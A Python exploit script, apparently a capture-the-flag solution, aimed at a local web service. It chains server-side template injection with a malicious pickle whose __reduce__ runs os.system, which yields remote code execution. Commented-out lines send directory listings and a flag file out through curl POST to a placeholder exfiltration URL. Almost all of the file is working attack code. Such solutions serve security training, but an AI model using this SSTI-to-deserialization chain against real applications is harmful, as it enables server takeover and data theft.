import requests
import json
from bs4 import BeautifulSoup
import re
import pickle

url = "http://localhost:9229"


class DANGEROUS:
    def __reduce__(self):
        import os
        exfil_url = "your_url"
        # cmd = (f'ls | curl -X POST --data-binary @- {exfil_url}')
        # cmd = (f'cat flag.log | curl -X POST --data-binary @- {exfil_url}')
        cmd = (f'ls /')
        return os.system, (cmd,)


def main():
    exploit()


def exploit():
    # Find the list of all classes available in the current execution context
    payload = "{{ ''.__class__.__mro__[1].__subclasses__() }}"
    result = deliver_payload(payload)
    soup = BeautifulSoup(result, features="html.parser")
    paragraphContents = soup.find_all("code")[0]
    # find all items in single quotes
    parts = re.findall(r"'(.*?)'", str(paragraphContents))
    # Parse this list, and find the unpickler, a bytes-like IO object that supports read() and readlines(), and something to stick a bytearray into said IO object
    # parts = paragraphContents.split(",")
    # parts[0] = " " + parts[0]
    # parts = [part.split(" ")[2] for part in parts]
    unpickler = -1
    bytesio = -1
    byteclass = -1
    for i, part in enumerate(parts):
        if part == "_pickle.unpickler":
            print(part)
            unpickler = i
        elif "spooledtemporaryfile" in part:
            print(part)
            bytesio = i
        elif part == "bytes":
            print(part)
            byteclass = i
    # Construct the payload, roughly equivalent to:
    # s = bytes([42]) # byte array containing the pickled object used to get RCE
    # f = SpooledTemporaryFile() # IO object, found by fuzzing all subclasses available
    # f.write(s)
    # f.seek(0)
    # u = Unpickler(f) # unpickler object, used to get RCE
    # u.load() # ggs
    setter = "{% " + \
        f"set f = {get_class(bytesio)}()" \
        + " %}"
    setter2 = "{% " + \
        f"set uc = {get_class(unpickler)}" \
        + " %}"
    setter3 = "{% " + \
        f"set b = {get_class(byteclass)}" \
        + " %}"
    setter4 = "{% " + \
        f"set d = b({generate_intarray(DANGEROUS)})" \
        + " %}"
    getter = "{{ " + \
        f"f.write(d)" \
        + " }}"
    getter2 = "{{ " + \
        f"f.seek(0)" \
        + " }}"
    setter5 = "{% " + \
        f"set u = uc(f)" \
        + " %}"
    getter3 = "{{ " + \
        f"u.load()" \
        + " }}"
    setter_start = [setter, setter2, setter3, setter4]
    getter_start = [getter, getter2]
    setter_end = [setter5]
    getter_end = [getter3]
    payload_order = [setter_start, getter_start, setter_end, getter_end]
    new_payload = "\n".join(["\n".join(p) for p in payload_order])
    result = deliver_payload(new_payload)
    soup = BeautifulSoup(result, features="html.parser")
    soup.find_all("p")
    print("Done!")


def generate_intarray(classname):
    p = pickle.dumps(classname())
    arr = []
    for b in p:
        arr.append(b)
    return str(arr)


def get_class(i):
    return f"''.__class__.__mro__[1].__subclasses__()[{i}]"


def deliver_payload(payload):
    obj = {
        "test": payload,
    }
    r = requests.post(url + "/create-pickle", data={"code": json.dumps(obj)})
    uid = r.text
    if "Invalid" in uid:
        print("fuq")
        exit()
    r = requests.get(url + "/view-pickle?uid=" + uid)
    return r.text


if __name__ == "__main__":
    main()
